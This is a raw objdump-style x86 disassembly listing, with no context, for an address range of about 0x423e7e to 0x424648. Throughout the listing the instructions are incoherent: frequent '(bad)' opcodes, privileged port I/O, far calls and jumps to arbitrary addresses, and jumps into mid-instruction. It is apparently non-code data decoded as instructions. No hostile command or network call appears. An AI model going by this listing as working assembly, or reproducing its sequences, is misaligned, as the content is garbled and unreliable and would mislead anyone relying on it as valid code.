  423e7e:	push   ebx
  423e7f:	pushf  
  423e80:	cmp    BYTE PTR [esi],al
  423e82:	and    DWORD PTR [esi],ebp
  423e84:	inc    ecx
  423e85:	popa   
  423e86:	pop    es
  423e87:	je     0x423e0c
  423e89:	pushf  
  423e8a:	jo     0x423eac
  423e8c:	(bad)  
  423e8d:	adc    eax,0xa4b17cf0
  423e92:	pop    ss
  423e93:	jae    0x423f12
  423e95:	cmc    
  423e96:	lods   eax,DWORD PTR ds:[esi]
  423e97:	ret    0x23e6
  423e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e9b:	shl    BYTE PTR [eax-0x66],1
  423e9e:	fwait
  423e9f:	jnp    0x423e75
  423ea1:	inc    esi
  423ea2:	mov    bh,0x56
  423ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ea5:	imul   esi,DWORD PTR [esi-0x4e],0xf
  423ea9:	aas    
  423eaa:	aaa    
  423eab:	aad    0xf5
  423ead:	xchg   cl,al
  423eaf:	inc    esi
  423eb0:	and    al,0x92
  423eb2:	mov    ah,0xd0
  423eb4:	adc    eax,0x21ebb3a2
  423eb9:	into   
  423eba:	std    
  423ebb:	sti    
  423ebc:	pop    esi
  423ebd:	adc    al,0xbe
  423ebf:	loope  0x423ede
  423ec1:	mov    ecx,0xd980899d
  423ec6:	inc    esi
  423ec7:	pop    ebx
  423ec8:	and    cl,ch
  423eca:	ror    BYTE PTR [esi+0x7e],0xdb
  423ece:	out    dx,eax
  423ecf:	(bad)  
  423ed1:	imul   BYTE PTR [ebp+0x140384a6]
  423ed7:	mov    bl,0x3b
  423ed9:	(bad)  
  423eda:	fiadd  DWORD PTR [ebx]
  423edc:	jb     0x423f23
  423ede:	mov    ds:0xfce44648,al
  423ee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ee4:	adc    BYTE PTR [esi+0x2f7f244d],0x97
  423eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423eec:	inc    edx
  423eed:	cdq    
  423eee:	xor    eax,0x1df77962
  423ef3:	jne    0x423eb7
  423ef5:	sub    al,0x40
  423ef7:	and    cl,dh
  423ef9:	in     eax,0x20
  423efb:	cmp    eax,0xb8c24d4b
  423f00:	cmp    eax,0x5e57374d
  423f05:	nop
  423f06:	je     0x423f4e
  423f08:	xor    eax,0x506f2271
  423f0d:	mov    ds,WORD PTR [ecx+0x38c4176d]
  423f13:	mov    bl,0xb
  423f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f16:	sub    bl,BYTE PTR [ebx+0x1e67b778]
  423f1c:	jmp    0x8d403c80
  423f21:	xor    al,0x70
  423f23:	jmp    0xac35139
  423f28:	inc    eax
  423f29:	(bad)  
  423f2a:	stc    
  423f2b:	xlat   BYTE PTR ds:[ebx]
  423f2c:	retf   
  423f2d:	fcmovu st,st(4)
  423f2f:	pop    eax
  423f30:	xchg   ebx,eax
  423f31:	mov    bl,BYTE PTR [edx]
  423f33:	adc    eax,0x667fb2b0
  423f38:	pop    ds
  423f39:	xor    al,0x13
  423f3b:	loopne 0x423f38
  423f3d:	sbb    esi,DWORD PTR [eax+0x7e79dc11]
  423f43:	call   0xb8a8:0xefb548c3
  423f4a:	push   edi
  423f4b:	xchg   esp,eax
  423f4c:	ret    0x860f
  423f4f:	ins    DWORD PTR es:[edi],dx
  423f50:	sar    esp,cl
  423f52:	xor    ebx,ebx
  423f54:	fild   DWORD PTR [esi]
  423f56:	and    al,0xd1
  423f58:	jg     0x423f44
  423f5a:	clc    
  423f5b:	or     dl,BYTE PTR [ecx]
  423f5d:	(bad)  [ecx]
  423f5f:	in     eax,dx
  423f60:	imul   ebp,DWORD PTR gs:[ebx],0x27
  423f64:	sar    BYTE PTR [esi-0x2b],1
  423f67:	shl    eax,cl
  423f69:	push   ebp
  423f6a:	test   BYTE PTR [edx],ch
  423f6c:	push   0xffffff95
  423f6e:	adc    al,0xa2
  423f70:	adc    bh,BYTE PTR ds:0xda7e0937
  423f76:	outs   dx,BYTE PTR ds:[esi]
  423f77:	test   edx,ecx
  423f79:	cwde   
  423f7a:	mov    BYTE PTR [edi+edi*4-0xb],dh
  423f7e:	push   esp
  423f7f:	sub    al,0x35
  423f81:	sbb    eax,0xe030d161
  423f86:	and    esi,DWORD PTR [esi]
  423f88:	clc    
  423f89:	sub    BYTE PTR [eax+esi*2+0x40],al
  423f8d:	and    ch,bl
  423f8f:	in     al,dx
  423f90:	cmp    eax,0xef245b83
  423f95:	sahf   
  423f96:	mov    eax,0xf20598e0
  423f9b:	or     DWORD PTR [ebp+0x70699b4f],esi
  423fa1:	arpl   WORD PTR [esi-0x6],cx
  423fa4:	data16 in al,0x3b
  423fa7:	jbe    0x423f5f
  423fa9:	je     0x423fb2
  423fab:	out    dx,eax
  423fac:	inc    eax
  423fad:	iret   
  423fae:	sbb    bl,BYTE PTR [esi+esi*8+0x12]
  423fb2:	(bad)  
  423fb3:	adc    ebp,DWORD PTR [edi]
  423fb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fb6:	mov    al,0x33
  423fb8:	xchg   ebp,eax
  423fb9:	into   
  423fba:	dec    eax
  423fbb:	outs   dx,DWORD PTR ds:[esi]
  423fbc:	mov    ds:0xb6614e79,eax
  423fc1:	and    eax,0xae1a3ce6
  423fc6:	in     eax,0x1b
  423fc8:	es push 0xffffffbe
  423fcb:	fisub  WORD PTR [eax]
  423fcd:	nop
  423fce:	(bad)  
  423fcf:	jb     0x42400d
  423fd1:	jo     0x42404a
  423fd3:	push   ss
  423fd4:	(bad)  
  423fd5:	in     eax,dx
  423fd6:	test   al,0x4e
  423fd8:	pop    ss
  423fd9:	jmp    0x423f83
  423fdb:	stos   DWORD PTR es:[edi],eax
  423fdc:	add    ebx,ecx
  423fde:	xchg   BYTE PTR [ebx-0x18],dh
  423fe1:	(bad)  
  423fe3:	cmp    dl,ch
  423fe5:	xchg   ebx,eax
  423fe6:	aaa    
  423fe7:	mov    al,0xf
  423fe9:	fs jecxz 0x423ff6
  423fec:	daa    
  423fed:	cld    
  423fee:	shl    DWORD PTR [ecx+0x6a],cl
  423ff1:	shl    DWORD PTR [edx-0x7c],1
  423ff4:	push   cs
  423ff5:	jg     0x424074
  423ff7:	and    BYTE PTR [edi],dh
  423ff9:	rol    BYTE PTR [esi],1
  423ffb:	in     eax,dx
  423ffc:	lods   al,BYTE PTR ds:[esi]
  423ffd:	outs   dx,DWORD PTR ds:[esi]
  423ffe:	shl    BYTE PTR [edi],cl
  424000:	sahf   
  424001:	sub    eax,0xe58febcc
  424006:	out    dx,al
  424007:	pop    ds
  424008:	mov    WORD PTR ds:0x496b3cb3,?
  42400e:	or     al,0x52
  424010:	pop    eax
  424011:	sahf   
  424012:	push   esi
  424013:	jnp    0x423faf
  424015:	fdiv   DWORD PTR [esi+0x309a3f96]
  42401b:	jmp    0x8163:0x43b94db0
  424022:	je     0x423ff9
  424024:	mov    ecx,0x2d1631ea
  424029:	aam    0xa0
  42402b:	aaa    
  42402c:	ret    0xce52
  42402f:	add    bh,ah
  424031:	enter  0x1f85,0xb7
  424035:	scas   eax,DWORD PTR es:[edi]
  424036:	sbb    edi,ebp
  424038:	inc    esi
  424039:	push   ecx
  42403a:	jp     0x4240a9
  42403c:	lods   eax,DWORD PTR ss:[esi]
  42403e:	push   es
  42403f:	xor    DWORD PTR [esi+0x582a7369],ebp
  424045:	xor    eax,0x9881302c
  42404a:	lock add eax,0x7281a8e
  424050:	loopne 0x424032
  424052:	jne    0x423fd4
  424054:	mov    ebx,0xa968588f
  424059:	add    BYTE PTR [eax],al
  42405b:	add    BYTE PTR [ebx-0x73],al
  42405e:	pop    ds
  42405f:	and    bh,bl
  424061:	mov    dl,0x7f
  424063:	out    dx,eax
  424064:	add    BYTE PTR [ebx-0x2d2d8f0],dl
  42406a:	and    eax,DWORD PTR [edi+eiz*1]
  42406d:	mov    edx,0x2850001
  424072:	add    BYTE PTR [eax],al
  424074:	hlt    
  424075:	push   edx
  424076:	ds and dh,ch
  424079:	xor    eax,0xa08accda
  42407e:	cmp    BYTE PTR [edx+0x745dd6cc],0xf
  424085:	adc    BYTE PTR [eax-0x1190ef40],0xa9
  42408c:	test   BYTE PTR [edx-0x70362695],dh
  424092:	push   ebp
  424093:	jb     0x42405d
  424095:	or     edx,DWORD PTR [ebx]
  424097:	jne    0x4240d1
  424099:	mov    edi,edx
  42409b:	sbb    eax,0x29a7de25
  4240a0:	mov    WORD PTR [edi+0x40],?
  4240a3:	and    eax,0x2ab96ca
  4240a8:	xchg   ebx,eax
  4240a9:	out    0x4b,al
  4240ab:	jo     0x42411a
  4240ad:	ja     0x4240f8
  4240af:	iret   
  4240b0:	sbb    al,0x10
  4240b2:	pop    esp
  4240b3:	int3   
  4240b4:	scas   eax,DWORD PTR es:[edi]
  4240b5:	xor    bl,BYTE PTR [ebx-0x34db9fa6]
  4240bb:	cmc    
  4240bc:	int3   
  4240bd:	imul   esi,DWORD PTR [ebp+eax*8-0x5ecf9236],0xd49e69e0
  4240c8:	xor    al,0xd1
  4240ca:	(bad)  
  4240cb:	enter  0x8e5b,0x9d
  4240cf:	lahf   
  4240d0:	(bad)  
  4240d1:	push   esi
  4240d2:	push   ebp
  4240d3:	dec    esi
  4240d4:	leave  
  4240d5:	into   
  4240d6:	mov    bh,0x1e
  4240d8:	ret    0x701c
  4240db:	aas    
  4240dc:	mov    esi,DWORD PTR ds:[ebx+0x6288235c]
  4240e3:	stos   DWORD PTR es:[edi],eax
  4240e4:	pop    ebx
  4240e5:	and    edx,eax
  4240e7:	stos   BYTE PTR es:[edi],al
  4240e8:	lahf   
  4240e9:	pusha  
  4240ea:	call   0xe0d6:0x4927ab72
  4240f1:	push   esp
  4240f2:	cmp    eax,0x7b589d90
  4240f7:	fsubr  st(1),st
  4240f9:	mov    ds:0xd997a7fc,al
  4240fe:	sub    DWORD PTR [esi-0x300554cb],esp
  424104:	add    ebp,edi
  424106:	rcr    eax,0x62
  424109:	mov    eax,ds:0x3719374e
  42410e:	popf   
  42410f:	push   0xffffffb9
  424111:	push   ds
  424112:	cli    
  424113:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424114:	and    dl,BYTE PTR [edx-0x14d61ddc]
  42411a:	nop
  42411b:	cmp    ah,BYTE PTR [ebx]
  42411d:	lods   eax,DWORD PTR ds:[esi]
  42411e:	inc    edx
  42411f:	jl     0x4240e9
  424121:	mov    eax,ds:0x475b6fc9
  424126:	(bad)  
  424127:	popf   
  424128:	push   ebx
  424129:	sti    
  42412a:	ds in  eax,0xd3
  42412d:	mov    esp,0x1899dc2e
  424132:	inc    ebx
  424133:	js     0x4240c8
  424135:	push   ebp
  424136:	sar    DWORD PTR [eax-0x77b45f09],cl
  42413c:	cmp    esp,DWORD PTR [edx+0x7d09057d]
  424142:	cmp    cl,BYTE PTR es:[ebx]
  424145:	iret   
  424146:	add    ebp,DWORD PTR ds:0x2934b0dc
  42414c:	add    eax,0x22a850ee
  424151:	xchg   ebx,eax
  424152:	push   edi
  424153:	sub    eax,0x2ce3aa70
  424158:	mov    ecx,0xa8196dbd
  42415d:	push   0x17
  42415f:	add    edi,DWORD PTR [esi+0x4e052672]
  424165:	fimul  DWORD PTR [ebx]
  424167:	mov    cs,WORD PTR [ecx-0x6e57d0c3]
  42416d:	cdq    
  42416e:	mov    eax,0x46497a08
  424173:	test   dh,cl
  424175:	xlat   BYTE PTR ds:[ebx]
  424176:	mov    BYTE PTR [edi],ch
  424178:	add    ah,BYTE PTR [eax]
  42417a:	or     eax,0x885995f4
  42417f:	stos   DWORD PTR es:[edi],eax
  424180:	lock je 0x4241d0
  424183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424184:	cmp    DWORD PTR [ebp-0xb435a4c],0x5b
  42418b:	mov    ch,0xab
  42418d:	aaa    
  42418e:	mov    bh,0x16
  424190:	test   al,0xb
  424192:	cmp    BYTE PTR [ebx+0x78],0xd0
  424196:	aad    0xf0
  424198:	cmc    
  424199:	ret    0xafe6
  42419c:	push   ebp
  42419d:	xchg   esp,eax
  42419e:	inc    ebx
  42419f:	int3   
  4241a0:	icebp  
  4241a1:	loopne 0x424198
  4241a3:	repz cmp BYTE PTR [ebx],dl
  4241a6:	pop    edx
  4241a7:	out    0x70,eax
  4241a9:	imul   ebp,ebp,0xc
  4241ac:	imul   ecx,DWORD PTR [edi+ecx*8-0x627830fd],0xba67acd1
  4241b7:	shr    BYTE PTR [edi+0x501e817b],0xe9
  4241be:	jne    0x424234
  4241c0:	jg     0x4241f5
  4241c2:	or     eax,0xc3f38e35
  4241c7:	stos   DWORD PTR es:[edi],eax
  4241c8:	(bad)  
  4241c9:	cdq    
  4241ca:	ds lahf 
  4241cc:	(bad)  
  4241cd:	in     al,dx
  4241ce:	pop    ss
  4241cf:	addr16 jbe 0x4241e8
  4241d2:	dec    esi
  4241d3:	add    DWORD PTR [bx+di],0xc512f2fe
  4241da:	in     al,0xb0
  4241dc:	js     0x424251
  4241de:	inc    esi
  4241df:	out    dx,al
  4241e0:	outs   dx,DWORD PTR ds:[esi]
  4241e1:	std    
  4241e2:	ins    DWORD PTR es:[edi],dx
  4241e3:	call   FWORD PTR [edi-0x36482178]
  4241e9:	call   0xfd73:0x23522fe
  4241f0:	xor    dl,bh
  4241f2:	mov    al,ds:0x3a45bf0e
  4241f7:	out    0x2e,al
  4241f9:	rcl    BYTE PTR [edi+ecx*4-0x5c],cl
  4241fd:	jg     0x424230
  4241ff:	(bad)  [edi+0x7a]
  424202:	ins    WORD PTR es:[edi],dx
  424204:	div    BYTE PTR [edi]
  424206:	in     al,0xc4
  424208:	jnp    0x42427d
  42420a:	ja     0x42424d
  42420c:	int    0x27
  42420e:	pop    edi
  42420f:	pop    ecx
  424210:	and    ah,BYTE PTR [ecx-0x102291b7]
  424216:	fbstp  TBYTE PTR [ebx+0x29c37baa]
  42421c:	(bad)  
  42421d:	sbb    DWORD PTR [edi+0x5e],ebp
  424220:	sbb    al,0x42
  424222:	jnp    0x4241b8
  424224:	jbe    0x424227
  424226:	mov    edx,0x1e348d8d
  42422b:	add    BYTE PTR [eax+0x60],0x45
  42422f:	ja     0x4241d2
  424231:	fldcw  WORD PTR [ecx]
  424233:	fwait
  424234:	in     al,0xaf
  424236:	sbb    eax,0x68c72b4d
  42423b:	jg     0x42423b
  42423d:	cmp    dl,BYTE PTR [edi+0x1f]
  424240:	jnp    0x4241de
  424242:	pop    ebp
  424243:	pop    edi
  424244:	sub    al,ch
  424246:	aam    0xc6
  424248:	inc    ecx
  424249:	push   es
  42424a:	mov    esp,0xe4c55c2e
  42424f:	mov    eax,0x3bedd7b0
  424254:	add    dl,BYTE PTR [ebx+0x236d3b25]
  42425a:	scas   al,BYTE PTR es:[edi]
  42425b:	inc    esi
  42425c:	xchg   ebp,eax
  42425d:	jecxz  0x42420b
  42425f:	push   ebp
  424260:	mov    al,0x8e
  424262:	sbb    edi,DWORD PTR [ecx]
  424264:	into   
  424265:	xchg   ecx,eax
  424266:	adc    cl,BYTE PTR [eax]
  424268:	mov    esi,0xa7a962ea
  42426d:	aas    
  42426e:	adc    bl,BYTE PTR [ebp+0x5e313505]
  424274:	and    DWORD PTR [edi],eax
  424276:	xchg   esp,eax
  424277:	mov    dl,BYTE PTR [eax]
  424279:	popa   
  42427a:	sbb    edi,DWORD PTR [eax+0x489485e6]
  424280:	adc    edx,DWORD PTR [eax+ebp*2]
  424283:	dec    ebx
  424284:	and    al,0x3e
  424286:	inc    ebx
  424287:	pop    ecx
  424288:	call   0xa70f885
  42428d:	outs   dx,DWORD PTR ds:[esi]
  42428e:	fld    DWORD PTR [edx-0x62]
  424291:	loopne 0x4242fc
  424293:	aad    0x5d
  424295:	addr16 jp 0x424254
  424298:	(bad)  
  424299:	test   eax,0xc0e4227b
  42429e:	adc    eax,0x56f425ef
  4242a3:	push   0xa
  4242a5:	fld    QWORD PTR [eax-0x635d30b9]
  4242ab:	mov    esi,0x1486c104
  4242b0:	or     dl,BYTE PTR [ebp-0x8]
  4242b3:	outs   dx,BYTE PTR ds:[esi]
  4242b4:	outs   dx,DWORD PTR ds:[esi]
  4242b5:	and    al,0xc6
  4242b7:	jmp    0x6e04d157
  4242bc:	or     al,ah
  4242be:	add    BYTE PTR [eax+edx*8+0x37],ah
  4242c2:	loopne 0x42432b
  4242c4:	dec    edx
  4242c5:	xor    BYTE PTR [esi],ch
  4242c7:	or     cl,bl
  4242c9:	call   0x806b6115
  4242ce:	or     al,0xea
  4242d0:	cmp    DWORD PTR [esi+0x626645c1],edi
  4242d6:	pop    ss
  4242d7:	mov    al,0x13
  4242d9:	push   edx
  4242da:	and    eax,0xa6dd0550
  4242df:	mov    ecx,0x7f0dcfb5
  4242e4:	adc    ebx,DWORD PTR [ebx+0x15a72fa9]
  4242ea:	cmp    eax,0x8985c322
  4242ef:	(bad)  
  4242f0:	fdivr  DWORD PTR [ebp+eax*1-0x5c952200]
  4242f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242f8:	xor    eax,DWORD PTR [eax]
  4242fa:	add    BYTE PTR [eax],al
  4242fc:	hlt    
  4242fd:	cmp    DWORD PTR [edx-0x2002081],edx
  424303:	mov    ebx,0xc0721507
  424308:	test   DWORD PTR [edx-0x43534979],edx
  42430e:	add    DWORD PTR [eax],eax
  424310:	test   DWORD PTR [edx],eax
  424312:	add    BYTE PTR [eax],al
  424314:	js     0x424383
  424316:	mov    dl,0x44
  424318:	jae    0x42429c
  42431a:	pushf  
  42431b:	xchg   esp,eax
  42431c:	arpl   WORD PTR [edi],cx
  42431e:	push   ebp
  42431f:	das    
  424320:	dec    ebx
  424321:	jmp    0xfc4a:0x89fb6843
  424328:	dec    ecx
  424329:	lea    ecx,ds:0x3c3b86c6
  42432f:	sub    bh,BYTE PTR [ecx-0x6a]
  424332:	das    
  424333:	nop
  424334:	adc    eax,0x1d01873b
  424339:	out    dx,al
  42433a:	cli    
  42433b:	mov    ebp,DWORD PTR [edx+0x506b85d3]
  424341:	iret   
  424342:	adc    BYTE PTR [esi],bh
  424344:	sbb    al,cl
  424346:	jmp    0x3e6d89e6
  42434b:	mov    ecx,0x7a60de61
  424350:	mov    ah,0x74
  424352:	add    DWORD PTR [eax-0x7d3dfa1],eax
  424358:	popa   
  424359:	cs add ecx,edx
  42435c:	pop    ecx
  42435d:	out    dx,eax
  42435e:	jne    0x4243d3
  424360:	lock mov ebp,0x87ea265c
  424366:	jle    0x42430d
  424368:	arpl   WORD PTR ds:0xaf7631b9,di
  42436e:	scas   eax,DWORD PTR es:[edi]
  42436f:	push   esp
  424370:	mov    DWORD PTR ds:0xe48a2abc,esi
  424376:	xchg   esi,eax
  424377:	dec    esp
  424378:	scas   al,BYTE PTR es:[edi]
  424379:	arpl   dx,di
  42437b:	pop    ebp
  42437c:	lds    ebx,FWORD PTR [ebp+0x72]
  42437f:	stos   BYTE PTR es:[edi],al
  424380:	sbb    al,0x9d
  424382:	sub    edi,DWORD PTR [eax+0x6]
  424385:	mov    esi,0x47f28ffd
  42438a:	sub    BYTE PTR ds:[edi+ecx*1],al
  42438e:	xchg   ecx,eax
  42438f:	cmp    al,0x2c
  424391:	pop    edi
  424392:	rcr    esi,0xae
  424395:	mov    edi,DWORD PTR [ebp-0x45]
  424398:	ret    
  424399:	in     al,dx
  42439a:	pop    eax
  42439b:	mov    ds:0x2eb97,eax
  4243a0:	repz and dh,bh
  4243a3:	in     al,0xa7
  4243a5:	fcom   QWORD PTR [edx+0x5d]
  4243a8:	pop    es
  4243a9:	or     eax,DWORD PTR [eax]
  4243ab:	sbb    BYTE PTR [ebx+eiz*1-0xb],ah
  4243af:	and    al,0xca
  4243b1:	sbb    eax,DWORD PTR [ebx-0x12]
  4243b4:	(bad)  
  4243b5:	mov    ch,0xa0
  4243b7:	lods   al,BYTE PTR ds:[esi]
  4243b8:	leave  
  4243b9:	pusha  
  4243ba:	ficom  DWORD PTR es:[ecx-0xf093aef]
  4243c1:	pop    ds
  4243c2:	dec    ebx
  4243c3:	pop    esi
  4243c4:	adc    bh,cl
  4243c6:	fldenv [eax+0x71]
  4243c9:	cmp    al,0x4b
  4243cb:	std    
  4243cc:	cs (bad) 
  4243cf:	pusha  
  4243d0:	imul   edi,DWORD PTR [edx+eiz*8-0x1c],0xffffffd5
  4243d5:	push   ebx
  4243d6:	data16 mov cl,BYTE PTR [ecx+0x7e]
  4243da:	sub    al,0xd0
  4243dc:	mov    BYTE PTR [eax+0x6d8a3262],ah
  4243e2:	xchg   ebp,eax
  4243e3:	push   ebp
  4243e4:	ja     0x424462
  4243e6:	jae    0x424416
  4243e8:	out    dx,eax
  4243e9:	dec    eax
  4243ea:	inc    esi
  4243eb:	sahf   
  4243ec:	jmp    0x397b0ac1
  4243f1:	leave  
  4243f2:	out    0x13,eax
  4243f4:	pop    ecx
  4243f5:	mov    ebp,0xd19c70f6
  4243fa:	jno    0x4243c8
  4243fc:	sbb    ebp,DWORD PTR [eax]
  4243fe:	mov    dh,0x86
  424400:	push   es
  424401:	xchg   esp,eax
  424402:	icebp  
  424403:	jmp    0xde14ede5
  424408:	je     0x424473
  42440a:	or     eax,0x9535fb86
  42440f:	mov    dl,ah
  424411:	pop    edi
  424412:	sub    DWORD PTR [ebx-0x18cc6a40],ecx
  424418:	xchg   esp,eax
  424419:	mov    ah,0x0
  42441b:	in     eax,0xe
  42441d:	outs   dx,DWORD PTR ds:[esi]
  42441e:	push   ds
  42441f:	lods   al,BYTE PTR ds:[esi]
  424420:	add    BYTE PTR [ebx],dl
  424422:	dec    ebp
  424423:	popa   
  424424:	xor    eax,0xdd151dc0
  424429:	sbb    DWORD PTR [ebp+0x529e08ae],ebp
  42442f:	sub    DWORD PTR [edx-0x352dfcb7],edi
  424435:	adc    al,dh
  424437:	cli    
  424438:	loopne 0x424468
  42443a:	dec    ecx
  42443b:	mov    ah,0x4e
  42443d:	and    edi,DWORD PTR [edi+0x50035bc2]
  424443:	dec    ebp
  424444:	cmp    esi,ebx
  424446:	and    ebx,esi
  424448:	shl    DWORD PTR [ecx],cl
  42444a:	aas    
  42444b:	repnz adc eax,0xa2d73012
  424451:	jge    0x424437
  424453:	in     al,0x68
  424455:	(bad)  
  424456:	sahf   
  424457:	lea    esp,[edx]
  424459:	rol    DWORD PTR [eax-0x2f],1
  42445c:	sub    al,ah
  42445e:	scas   al,BYTE PTR es:[edi]
  42445f:	push   es
  424460:	mov    al,0xa5
  424462:	pop    es
  424463:	mov    cl,0x8c
  424465:	sub    BYTE PTR [ecx],ch
  424467:	mov    dl,0xe9
  424469:	add    eax,0xe91c815c
  42446e:	daa    
  42446f:	and    ecx,DWORD PTR [edx+0x35e77d20]
  424475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424476:	pop    edx
  424477:	xchg   edi,eax
  424478:	mov    esi,0x2436a77d
  42447d:	add    esi,DWORD PTR ds:0x9fc3e7e8
  424483:	call   0x97cb:0x6eb64d
  42448a:	into   
  42448b:	and    DWORD PTR [ecx+0x6a60fd5],0xd32fc6df
  424495:	jb     0x4244f9
  424497:	or     eax,0xb43a90d3
  42449c:	push   es
  42449d:	cmp    eax,eax
  42449f:	cmp    DWORD PTR [ecx+eax*2-0x6095ab01],0xffffff88
  4244a7:	ror    bh,cl
  4244a9:	rcl    DWORD PTR [edi-0x6988cc10],1
  4244af:	mov    WORD PTR [edx],cs
  4244b1:	dec    ecx
  4244b2:	push   ebp
  4244b3:	cmc    
  4244b4:	push   cs
  4244b5:	(bad)  
  4244b6:	outs   dx,DWORD PTR ds:[esi]
  4244b7:	aaa    
  4244b8:	cmp    ebx,DWORD PTR [esi+0x44331505]
  4244be:	xlat   BYTE PTR ds:[ebx]
  4244bf:	adc    eax,DWORD PTR [ebp+eax*4+0x603462ac]
  4244c6:	adc    al,0x4b
  4244c8:	pop    ecx
  4244c9:	out    0xa4,al
  4244cb:	ins    DWORD PTR es:[edi],dx
  4244cc:	popf   
  4244cd:	and    esi,DWORD PTR ds:[ecx+eax*1-0x57]
  4244d2:	jne    0x42451f
  4244d4:	dec    ebx
  4244d5:	idiv   DWORD PTR [eax+0x5e]
  4244d8:	call   0x743b:0x63202fbc
  4244df:	aaa    
  4244e0:	ins    BYTE PTR es:[edi],dx
  4244e1:	and    dl,dl
  4244e3:	cli    
  4244e4:	(bad)  
  4244e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244e6:	popa   
  4244e7:	std    
  4244e8:	lock enter 0xc447,0x46
  4244ed:	add    BYTE PTR [ecx+0xe],0xb8
  4244f1:	outs   dx,BYTE PTR ds:[esi]
  4244f2:	jl     0x4244f2
  4244f4:	leave  
  4244f5:	jge    0x4244ee
  4244f7:	inc    eax
  4244f8:	push   edx
  4244f9:	sbb    al,0x86
  4244fb:	push   ecx
  4244fc:	mov    ds:0x4720d63b,eax
  424501:	test   eax,0x6507f2b2
  424506:	mov    dh,0x4f
  424508:	jne    0x4244b8
  42450a:	imul   ecx
  42450c:	jo     0x42450b
  42450e:	jo     0x424520
  424510:	add    eax,0x9bb5ce45
  424515:	aam    0x73
  424517:	popa   
  424518:	sub    DWORD PTR [eax-0x93aea4d],edx
  42451e:	xchg   esp,eax
  42451f:	adc    dh,ah
  424521:	pop    edx
  424522:	jecxz  0x42454c
  424524:	mov    edx,0x4cce0e70
  424529:	push   ds
  42452a:	(bad)
  42452d:	add    edi,DWORD PTR [ebx-0x9]
  424530:	in     al,dx
  424531:	cld    
  424532:	int3   
  424533:	(bad)  
  424534:	sti    
  424535:	adc    ebx,DWORD PTR [ecx-0x18]
  424538:	jo     0x424506
  42453a:	retf   
  42453b:	mov    BYTE PTR [eax-0x4066e22b],0x8e
  424542:	aad    0xf1
  424544:	xor    ecx,eax
  424546:	xor    BYTE PTR [eax+0x172e6e8d],ah
  42454c:	in     eax,0x7a
  42454e:	mov    ch,dh
  424550:	cmp    al,0xac
  424552:	and    DWORD PTR [ecx-0x11],esi
  424555:	bound  esi,QWORD PTR [ecx]
  424557:	cmp    al,0xfc
  424559:	dec    ebp
  42455a:	pop    ecx
  42455b:	retf   
  42455c:	push   ebx
  42455d:	mov    al,0xc2
  42455f:	aaa    
  424560:	out    dx,eax
  424561:	xchg   esp,eax
  424562:	fbld   TBYTE PTR [eax+edi*4+0x3d]
  424566:	push   ebx
  424567:	call   0x2005588a
  42456c:	and    ebp,DWORD PTR [esi-0x17]
  42456f:	mov    al,ds:0x931e74ed
  424574:	pop    eax
  424575:	loope  0x424526
  424577:	mov    BYTE PTR [ebp+0x3baa16ff],ch
  42457d:	xchg   edi,eax
  42457e:	rcl    ebx,0x79
  424581:	not    bl
  424583:	and    esi,DWORD PTR [esi+0x10952a5f]
  424589:	ds jbe 0x424549
  42458c:	aaa    
  42458d:	adc    eax,0x9e16901e
  424592:	inc    edi
  424593:	jle    0x4245c4
  424595:	mov    eax,ds:0x1c7a2e
  42459a:	add    BYTE PTR [eax],al
  42459c:	push   esp
  42459d:	ds and al,0x19
  4245a0:	outs   dx,BYTE PTR ds:[esi]
  4245a1:	sbb    edi,DWORD PTR [ebp+0x7f]
  4245a4:	(bad)  
  4245a5:	mov    eax,0x283fcfc0
  4245aa:	inc    ecx
  4245ab:	(bad)  
  4245ac:	xor    DWORD PTR [edi+0x2850001],edi
  4245b2:	add    BYTE PTR [eax],al
  4245b4:	jo     0x424543
  4245b6:	or     ecx,edi
  4245b8:	fcmovu st,st(6)
  4245ba:	jmp    0xd847eb3a
  4245bf:	sub    dl,dh
  4245c1:	xor    edi,ecx
  4245c3:	mov    ds:0x500c1ac8,eax
  4245c8:	jnp    0x42459b
  4245ca:	sahf   
  4245cb:	daa    
  4245cc:	bound  edi,QWORD PTR ds:0x2348f01a
  4245d2:	(bad)  
  4245d3:	or     al,BYTE PTR [edi-0x2e]
  4245d6:	xor    dl,BYTE PTR [ebp+0x6b]
  4245d9:	sbb    al,0x81
  4245db:	pop    ss
  4245dc:	mov    eax,ds:0xa0b5c5a7
  4245e1:	mov    ch,0x6e
  4245e3:	push   esp
  4245e4:	cmp    eax,0xdb9dfcc
  4245e9:	(bad)  
  4245eb:	fstp   QWORD PTR [ebp-0x4babf52e]
  4245f1:	dec    ebp
  4245f2:	es (bad) 
  4245f4:	shl    BYTE PTR [eax-0x26ac16fc],1
  4245fa:	cdq    
  4245fb:	adc    esi,DWORD PTR ds:0x47046e15
  424601:	int    0x6c
  424603:	aad    0xf
  424605:	sbb    BYTE PTR [esi+ecx*4],ah
  424608:	stos   DWORD PTR es:[edi],eax
  424609:	sub    edi,DWORD PTR [ecx+ebx*1+0x6f63318b]
  424610:	inc    esp
  424611:	(bad)  
  424613:	sar    BYTE PTR [edi+0x2b],1
  424616:	sub    eax,0x83ab760
  42461b:	xchg   ebx,eax
  42461c:	sub    bh,BYTE PTR [ecx-0x157c7582]
  424622:	mov    edx,DWORD PTR [eax]
  424624:	jge    0x424692
  424626:	popf   
  424627:	push   ecx
  424628:	sbb    DWORD PTR [edx-0x11],0xffffffe6
  42462c:	push   ss
  42462d:	dec    esp
  42462e:	mov    bh,0x51
  424630:	mov    ebp,0x71794fd3
  424635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424636:	xor    al,ch
  424638:	lds    edx,FWORD PTR [ebx-0x73]
  42463b:	outs   dx,BYTE PTR ds:[esi]
  42463c:	scas   al,BYTE PTR es:[edi]
  42463d:	imul   ebp,esp,0x5c
  424640:	dec    edi
  424641:	(bad)  
  424642:	das    
  424643:	xchg   bl,ch
  424645:	pop    ebp
  424646:	sbb    bl,dh
  424648:	sbb    al,0xbf
